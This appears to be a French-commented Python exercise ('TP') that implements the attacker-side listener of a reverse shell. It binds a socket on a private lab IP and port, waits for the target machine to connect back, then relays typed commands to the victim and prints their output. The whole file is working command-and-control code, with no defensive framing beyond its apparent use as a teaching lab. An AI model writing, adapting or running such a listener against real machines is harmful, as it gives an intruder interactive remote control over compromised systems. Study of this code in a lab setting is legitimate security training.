#TP sur reverse shell/ TCP Server sur python 

#importer la librairie python qui va nous permettre de pouvoir faire des connexion TCP/IP
import socket 

#creation d'une focntion qui va nous permettr d'etablir la connexion vers la cible en ouvrant un port sur notre machine attaquante pour recevoir les "inbound connexion" de venant de la cible 
def connect():
    s = socket.socket() #c'est un objet qui va creer une nouveau socket en utilisant la fonction socket 
    #on va lier le socket a notre IP et aussi au numero de port d'ecoute
    s.bind(("192.168.191.148", 8000))
    #define the backlog size (maximum nombre de connexion entrante et de queue ) pour recevoir le bond de notre cible uniquement
    s.listen(1)
    #call the exit fonction pour arreter la session 
    conn,  addr = s.accept() #deux parametre, la connexion, et l'ip de la cible et le port uriliser pour initier la connexion
    print('[+] yipee!! Connexion reussit vers la cible', addr)

    #il va mtn falloir trouver un moyen d'envoyer nos commande vers la cible
    while True:
        command = input("Shell> ")  #importer les inputs du user et stocke dans la variable "commande"
        #pour stopper la connection avec la cible lorsqu'on lance le mot cle 'terminate'
        if 'quit' in command:
            conn.send('terminate'.encode()) #encode le mot en caracter comprehensible par le terminale (binaire)
            conn.close() #close the connection
            break
        else:
            conn.send(command.encode()) #si non on envoi la commade que nous avons recu et l'encodons
            print(conn.recv(4096).decode()) #afficher le resultat decoder a l'ecran (la reponse)

def main():
    connect()
main()

